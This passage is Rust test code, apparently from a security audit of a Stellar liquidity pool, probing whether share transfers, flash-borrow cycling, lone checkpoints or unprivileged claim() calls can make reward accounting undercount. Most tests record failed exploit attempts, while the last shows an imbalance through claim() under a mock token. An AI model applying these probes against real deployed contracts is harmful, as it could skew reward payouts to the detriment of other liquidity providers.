        let rsac=token::TokenClient::new(&env,&reward.address());
        pool.claim(&keep);
        let got=rsac.balance(&keep) as u128;
        let fair=(1_000_0000000u128)*5; // one ledger of full emissions
        println!("[flash-e2e] cross-ledger claim on kept pos: got {} AQUA (a full period's emissions = {})", got, fair);

        // NEGATIVE RESULT: with the REAL share-token hook, cycling does NOT collapse WorkingSupply,
        // and the kept position earns only its fair pro-rata share (no over-distribution).
        assert!(ws_after_cycle >= ws_honest, "real hook: cycling does NOT collapse WorkingSupply (exploit fails)");
        assert!(recovered_t0 >= borrow/2, "flash-borrowed tokens recovered via withdraw (repayable)");
        assert!(got < fair, "kept position earns only its FAIR share, not an inflated payout (no exploit)");
    }

    // DECISIVE: with the REAL share token, does receiving shares via transfer create the WS undercount?
    // ISOLATION: does a LONE (single-sided) checkpoint_working_balance undercount on the real pool,
    // and does the transfer hook (paired) conserve it? Uses the REAL share token as token_contract.
    #[test]
    fn isolate_lone_checkpoint_vs_paired_transfer() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let boost = env.register(MockBoost, ());
        let plane = env.register(MockPlane, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(SHARE_REAL);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0,a1)=(t0.address(),t1.address());
        let mut tokens=Vec::new(&env);
        if a0<a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); } else { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged=(admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
        pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),
                            &(reward.address(),boost.clone(),boost.clone()),&plane,&plane);
        pool.set_reward_boost_config(&admin,&boost,&boost);
        let now=env.ledger().timestamp();
        pool.set_rewards_config(&admin,&(now+100_000_000u64),&1_000_0000000u128);
        let share=pool.share_id();
        let ws=||->i128{pool.get_rewards_info(&admin).get(Symbol::new(&env,"working_supply")).unwrap()};
        let mint=|w:&Address,a:i128|{token::StellarAssetClient::new(&env,&t0.address()).mint(w,&a);token::StellarAssetClient::new(&env,&t1.address()).mint(w,&a);};
        let two=|a:u128|{let mut v=Vec::new(&env);v.push_back(a);v.push_back(a);v};
        let honest=Address::generate(&env);
        mint(&honest,200_000_000_000); pool.deposit(&honest,&two(100_000_000_000),&0u128);

        // (A) LONE single-sided checkpoint on a fresh account (needs the share token's auth; mock_all_auths supplies it)
        let f=Address::generate(&env);
        let ws_a=ws();
        pool.checkpoint_working_balance(&share,&f,&100_000_000_000u128); // token_contract=real share token (matches stored)
        let ws_b=ws();
        let wbf:i128=pool.get_rewards_info(&f).get(Symbol::new(&env,"working_balance")).unwrap();
        println!("[isolate] LONE checkpoint(X=100e9): WS {}->{} (delta {}) ; fresh WB={} ; undercounted_by={}",
                 ws_a, ws_b, ws_b-ws_a, wbf, wbf-(ws_b-ws_a));
        // The latent bug: WS should rise by the full working balance (wbf), but rises by wbf - X.
        // This lone/unpaired path is NOT reachable on-chain: checkpoint_working_balance needs token auth,
        // and the share token only calls it PAIRED (transfer/transfer_from), with the receiver pre-checkpointed
        // at balance 0 (checkpoint_reward before the credit) -> old_wb=0 -> no undercount. mint/burn don't checkpoint.
        assert!((ws_b-ws_a) < wbf && wbf>0,
            "lone checkpoint under-increments WS by X (latent bug) — but this path is not attacker-reachable");
    }

    // BYPASS PROBE: transfer to a fresh account while rewards are INACTIVE (not yet configured),
    // then activate rewards and see if that account is a "fresh holder" that triggers the undercount.
    #[test]
    fn bypass_transfer_before_rewards_active() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let boost = env.register(MockBoost, ());
        let plane = env.register(MockPlane, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(SHARE_REAL);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0,a1)=(t0.address(),t1.address());
        let mut tokens=Vec::new(&env);
        if a0<a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); } else { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged=(admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
        pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),
                            &(reward.address(),boost.clone(),boost.clone()),&plane,&plane);
        let share=pool.share_id(); let shrc=shr::Client::new(&env,&share);
        let mint=|w:&Address,a:i128|{token::StellarAssetClient::new(&env,&t0.address()).mint(w,&a);token::StellarAssetClient::new(&env,&t1.address()).mint(w,&a);};
        let two=|a:u128|{let mut v=Vec::new(&env);v.push_back(a);v.push_back(a);v};
        let wb=|u:&Address|->i128{pool.get_rewards_info(u).get(Symbol::new(&env,"working_balance")).unwrap()};
        let ws=|u:&Address|->i128{pool.get_rewards_info(u).get(Symbol::new(&env,"working_supply")).unwrap()};

        // deposits happen; rewards NOT configured yet
        let honest=Address::generate(&env); mint(&honest,200_000_000_000); pool.deposit(&honest,&two(100_000_000_000),&0u128);
        let atk=Address::generate(&env); mint(&atk,200_000_000_000); let(_a,as1)=pool.deposit(&atk,&two(100_000_000_000),&0u128);
        // transfer to fresh F while rewards inactive
        let f=Address::generate(&env);
        shrc.transfer(&atk,&f,&(as1 as i128));
        println!("[bypass] pre-rewards: WB honest={} atk={} F={} ; WS={}", wb(&honest),wb(&atk),wb(&f),ws(&honest));

        // NOW activate rewards + fund, then run a period
        let now=env.ledger().timestamp();
        let tps:u128=1_000_0000000;
        pool.set_rewards_config(&admin,&(now+100_000_000u64),&tps);
        token::StellarAssetClient::new(&env,&reward.address()).mint(&pool.address,&1_000_000_000_000_000i128);
        let sum_wb=wb(&honest)+wb(&atk)+wb(&f); let working=ws(&honest);
        println!("[bypass] post-activate: WB honest={} atk={} F={} ; sum_WB={} WS={} (holds:{})",
                 wb(&honest),wb(&atk),wb(&f),sum_wb,working,sum_wb==working);
        env.ledger().set_timestamp(now+100);
        let total=pool.get_user_reward(&honest)+pool.get_user_reward(&atk)+pool.get_user_reward(&f);
        let funded=tps*100;
        println!("[bypass] total={} funded={} => {}%", total,funded,(total*100)/funded);
        assert!(total <= funded + funded/1000, "no over-distribution even when transfer happened before rewards were active");
    }

    #[test]
    fn real_token_invariant_and_no_overdistribution() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let boost = env.register(MockBoost, ());
        let plane = env.register(MockPlane, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(SHARE_REAL);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0,a1)=(t0.address(),t1.address());
        let mut tokens=Vec::new(&env);
        if a0<a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); } else { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged=(admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
        pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),
                            &(reward.address(),boost.clone(),boost.clone()),&plane,&plane);
        pool.set_reward_boost_config(&admin,&boost,&boost);
        let now=env.ledger().timestamp();
        let tps:u128=1_000_0000000;
        pool.set_rewards_config(&admin,&(now+100_000_000u64),&tps);
        token::StellarAssetClient::new(&env,&reward.address()).mint(&pool.address,&1_000_000_000_000_000i128);
        let share=pool.share_id();
        let shrc=shr::Client::new(&env,&share);
        let mint=|w:&Address,a:i128|{token::StellarAssetClient::new(&env,&t0.address()).mint(w,&a);token::StellarAssetClient::new(&env,&t1.address()).mint(w,&a);};
        let two=|a:u128|{let mut v=Vec::new(&env);v.push_back(a);v.push_back(a);v};
        let wb=|u:&Address|->i128{pool.get_rewards_info(u).get(Symbol::new(&env,"working_balance")).unwrap()};
        let ws=|u:&Address|->i128{pool.get_rewards_info(u).get(Symbol::new(&env,"working_supply")).unwrap()};

        let honest=Address::generate(&env);
        mint(&honest,200_000_000_000); pool.deposit(&honest,&two(100_000_000_000),&0u128);
        let atk=Address::generate(&env);
        mint(&atk,200_000_000_000); let(_a,ashares)=pool.deposit(&atk,&two(100_000_000_000),&0u128);
        // attacker sends all shares to a FRESH account via the REAL transfer hook (the "single-step" attempt)
        let fresh=Address::generate(&env);
        shrc.transfer(&atk,&fresh,&(ashares as i128));

        let sum_wb = wb(&honest)+wb(&atk)+wb(&fresh);
        let working_supply = ws(&honest);
        println!("[real-inv] WB honest={} atk={} fresh={} ; sum_WB={} WorkingSupply={} (invariant holds: {})",
                 wb(&honest),wb(&atk),wb(&fresh),sum_wb,working_supply, sum_wb==working_supply);

        env.ledger().set_timestamp(now+100);
        let total = pool.get_user_reward(&honest)+pool.get_user_reward(&atk)+pool.get_user_reward(&fresh);
        let funded = tps*100;
        println!("[real-inv] total rewards={} funded={} => {}% (>100% would mean over-distribution)", total, funded, (total*100)/funded);
        assert_eq!(sum_wb, working_supply, "with real share token, WorkingSupply == sum of WorkingBalances (no undercount)");
        assert!(total <= funded + funded/1000, "no over-distribution with the real share token");
    }

    #[test]
    fn claim_alone_creates_the_imbalance() {
        // Fully self-contained unprivileged path: no checkpoint_working_balance, only claim().
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let plane = env.register(MockPlane, ());
        let boost = env.register(MockBoost, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0, a1) = (t0.address(), t1.address());
        let mut tokens = Vec::new(&env);
        if a0 < a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); }
        else       { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged = (admin.clone(), admin.clone(), admin.clone(), admin.clone(),
                          Vec::<Address>::new(&env), admin.clone());
        pool.initialize_all(&admin, &privileged, &admin, &lp_hash, &tokens, &(30u32,30u32),
                            &(reward.address(), boost.clone(), boost.clone()), &plane, &plane);
        pool.set_reward_boost_config(&admin, &boost, &boost);
        let now = env.ledger().timestamp();
        pool.set_rewards_config(&admin, &(now + 1_000_000u64), &1_000_0000000u128);
        token::StellarAssetClient::new(&env, &reward.address()).mint(&pool.address, &1_000_000_000_000_000i128);
        let share = pool.share_id();
        let lpc = lp::Client::new(&env, &share);
        let x: u128 = 1_000_000_0000000;

        // honest LP, correct
        let honest = Address::generate(&env);
        lpc.mint(&honest, &(x as i128));
        pool.checkpoint_working_balance(&share, &honest, &0u128);
        pool.checkpoint_working_balance(&share, &honest, &x);
        let ws_before: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env, "working_supply")).unwrap();

        // fresh account holds shares but was never checkpointed; a single unprivileged claim() checkpoints it
        let victim_acct = Address::generate(&env);
        lpc.mint(&victim_acct, &(x as i128));
        pool.claim(&victim_acct);   // no owner auth; reads real balance; single-step checkpoint

        let ws_after: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env, "working_supply")).unwrap();
        let wb_fresh: i128 = pool.get_rewards_info(&victim_acct).get(Symbol::new(&env, "working_balance")).unwrap();
        println!("[claim-alone] WS before={} after={} (delta={}) ; fresh account WorkingBalance={}",
                 ws_before, ws_after, ws_after - ws_before, wb_fresh);
        // The fresh account now earns on wb_fresh, but WorkingSupply was NOT increased by it -> imbalance.
        assert_eq!(ws_before, ws_after, "claim() must not increase WorkingSupply for the fresh account");
        assert!(wb_fresh > 0, "claim() set a nonzero WorkingBalance for the fresh account");
    }
}
